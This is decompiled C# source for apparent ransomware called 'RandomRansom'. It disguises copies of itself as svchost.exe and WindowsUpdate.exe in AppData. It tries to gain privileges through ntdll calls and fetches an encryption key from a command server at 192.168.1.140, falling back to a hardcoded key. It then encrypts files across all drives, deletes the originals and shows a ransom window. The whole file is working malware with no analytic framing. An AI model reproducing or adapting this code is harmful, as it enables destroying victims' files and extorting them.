using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RandomRansom;

internal class Program
{
	private static bool t1;

	private static uint t2;

	private static Crypt c;

	[DllImport("User32.dll")]
	private static extern IntPtr GetDC(IntPtr hwnd);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	private static void Main(string[] args)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		if (Environment.UserName != "AHampster")
		{
			if (!Directory.Exists("C:\\Windows\\KillSwitch\\"))
			{
				Thread.Sleep(3000);
				infect();
			}
			else
			{
				MessageBox.Show("Kill switch activated!", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
		}
		else
		{
			MessageBox.Show("Kill switch activated!", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private static void infect()
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		if (Application.get_ExecutablePath().Contains("WindowsUpdate"))
		{
			try
			{
				try
				{
					Console.WriteLine("Creating RANDOM_RANSOM_DECRYPTOR window...");
					RANDOM_RANSOM rANDOM_RANSOM = new RANDOM_RANSOM();
					Console.WriteLine("Initializing RANDOM_RANSOM_DECRYPTOR window...");
					rANDOM_RANSOM.init();
					Console.WriteLine("Displaying RANDOM_RANSOM_DECRYPTOR window...");
					((Form)rANDOM_RANSOM).ShowDialog();
					Environment.Exit(666);
				}
				catch (Exception)
				{
				}
			}
			catch (Exception)
			{
			}
		}
		if (!Application.get_ExecutablePath().Contains("svchost"))
		{
			initial_infection();
			return;
		}
		string path = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\Appdata\\debug.txt");
		File.Delete(path);
		Payload();
	}

	private static void initial_infection()
	{
		try
		{
			Console.WriteLine("Infecting computer...");
			Console.WriteLine("Writing hostfile location in to file...");
			File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Appdata\\debug.txt", Application.get_ExecutablePath());
			Console.WriteLine("Copying host to infection location (svchost.exe)...");
			File.Copy(Application.get_ExecutablePath(), "C:\\Users\\" + Environment.UserName + "\\Appdata\\svchost.exe");
			Console.WriteLine("Copying host to infection location (WindowsUpdate.exe)...");
			File.Copy(Application.get_ExecutablePath(), "C:\\Users\\" + Environment.UserName + "\\Appdata\\WindowsUpdate.exe");
			Console.WriteLine("Starting fake svchost.exe...");
			Process.Start("C:\\Users\\" + Environment.UserName + "\\Appdata\\svchost.exe");
			Console.WriteLine("Exiting...");
			Environment.Exit(420);
		}
		catch (Exception)
		{
		}
	}

	private static void Payload()
	{
		//IL_0637: Unknown result type (might be due to invalid IL or missing references)
		Console.WriteLine("Acquiring super privilege...");
		int processInformation = 1;
		int processInformationClass = 29;
		try
		{
			RtlAdjustPrivilege(19, bEnablePrivilege: true, IsThreadPrivilege: false, out t1);
		}
		catch (Exception)
		{
		}
		try
		{
			Process.EnterDebugMode();
		}
		catch (Exception)
		{
		}
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
		}
		catch (Exception)
		{
		}
		Console.WriteLine("Acquired super provilege!");
		Console.WriteLine("Connecting to server...");
		NetworkStream networkStream = null;
		bool flag = false;
		string text = "29358672";
		try
		{
			if (CheckForInternetConnection())
			{
				TcpClient tcpClient = new TcpClient("192.168.1.140", 666);
				networkStream = tcpClient.GetStream();
				networkStream.Write(Encoding.ASCII.GetBytes("NULL"), 0, Encoding.ASCII.GetBytes("NULL").Length);
				byte[] array = new byte[512];
				int count = networkStream.Read(array, 0, array.Length);
				text = Encoding.ASCII.GetString(array, 0, count);
				flag = true;
				Console.WriteLine("Connected to server! Got token_id: " + text);
			}
		}
		catch (Exception)
		{
			Console.WriteLine("Failed to contact server! Using default token and key...");
			flag = false;
		}
		string password = "24673256314357864782457587907352546163578357932983965871751264823579081186246835792475172648935792643468426813572698264824724624";
		try
		{
			if (flag)
			{
				Console.WriteLine("Getting key from server with token...");
				byte[] bytes = Encoding.ASCII.GetBytes("GET KEY");
				networkStream.Write(bytes, 0, bytes.Length);
				byte[] array2 = new byte[512];
				int count2 = networkStream.Read(array2, 0, array2.Length);
				password = Encoding.ASCII.GetString(array2, 0, count2);
			}
		}
		catch (Exception)
		{
			Console.WriteLine("Failed to Request key from server! Exiting...");
			Environment.Exit(21);
		}
		if (flag)
		{
			Console.WriteLine("Got key!");
		}
		Console.WriteLine("Creating crypt class...");
		c = new Crypt();
		Console.WriteLine("Getting all files...");
		List<string> list = new List<string>();
		try
		{
			try
			{
				string[] directories = Directory.GetDirectories("C:\\" + Environment.UserName, "*", SearchOption.TopDirectoryOnly);
				List<string> list2 = new List<string>();
				try
				{
					string[] array3 = directories;
					foreach (string path in array3)
					{
						try
						{
							string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
							string[] array4 = files;
							foreach (string item in array4)
							{
								list2.Add(item);
							}
						}
						catch (Exception)
						{
							try
							{
								string[] files2 = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly);
								string[] array5 = files2;
								foreach (string item2 in array5)
								{
									list2.Add(item2);
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
				catch (Exception)
				{
				}
				foreach (string item6 in list2)
				{
					try
					{
						list.Add(item6);
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		try
		{
			try
			{
				string[] directories2 = Directory.GetDirectories("C:\\Users\\" + Environment.UserName, "*", SearchOption.TopDirectoryOnly);
				List<string> list3 = new List<string>();
				try
				{
					string[] array6 = directories2;
					foreach (string path2 in array6)
					{
						try
						{
							string[] files3 = Directory.GetFiles(path2, "*", SearchOption.AllDirectories);
							string[] array7 = files3;
							foreach (string item3 in array7)
							{
								list3.Add(item3);
							}
						}
						catch (Exception)
						{
							try
							{
								string[] files4 = Directory.GetFiles(path2, "*", SearchOption.TopDirectoryOnly);
								string[] array8 = files4;
								foreach (string item4 in array8)
								{
									list3.Add(item4);
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
				catch (Exception)
				{
				}
				foreach (string item7 in list3)
				{
					try
					{
						list.Add(item7);
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array9 = drives;
			foreach (DriveInfo driveInfo in array9)
			{
				DirectoryInfo rootDirectory = driveInfo.RootDirectory;
				string fullName = rootDirectory.FullName;
				try
				{
					string[] files5 = Directory.GetFiles(fullName, "*", SearchOption.AllDirectories);
					string[] array10 = files5;
					foreach (string item5 in array10)
					{
						try
						{
							list.Add(item5);
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		for (int num3 = 0; num3 < list.Count; num3++)
		{
			for (int num4 = 0; num4 < list.Count; num4++)
			{
				if (num4 != num3 && list[num3] == list[num4])
				{
					list[num4] = null;
				}
			}
		}
		Console.WriteLine("Encrypting files...");
		for (int num5 = 0; num5 < list.Count; num5++)
		{
			try
			{
				if (list[num5] != null && !list[num5].Contains("Windows"))
				{
					string input = "";
					using (StreamReader streamReader = new StreamReader(list[num5]))
					{
						input = streamReader.ReadToEnd();
						streamReader.Close();
					}
					string contents = c.EncryptText(input, password);
					File.WriteAllText(list[num5] + ".RANDOM", contents);
					File.Delete(list[num5]);
				}
			}
			catch (Exception)
			{
			}
		}
		Console.WriteLine("Deleting old files...");
		try
		{
			for (int num6 = 0; num6 < list.Count; num6++)
			{
				try
				{
					if (list[num6] != null && !list[num6].Contains("Windows"))
					{
						try
						{
							File.Delete(list[num6]);
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		Console.WriteLine("Saving token...");
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Appdata\\token.txt", text);
		Console.WriteLine("Saving all encrypted files list...");
		File.WriteAllLines("C:\\Users\\" + Environment.UserName + "\\Appdata\\files.txt", list.ToArray());
		try
		{
			Console.WriteLine("Creating RANDOM_RANSOM_DECRYPTOR window...");
			RANDOM_RANSOM rANDOM_RANSOM = new RANDOM_RANSOM();
			Console.WriteLine("Initializing RANDOM_RANSOM_DECRYPTOR window...");
			rANDOM_RANSOM.init();
			Console.WriteLine("Displaying RANDOM_RANSOM_DECRYPTOR window...");
			((Form)rANDOM_RANSOM).ShowDialog();
			Environment.Exit(666);
		}
		catch (Exception)
		{
		}
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://google.com/generate_204"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}
}
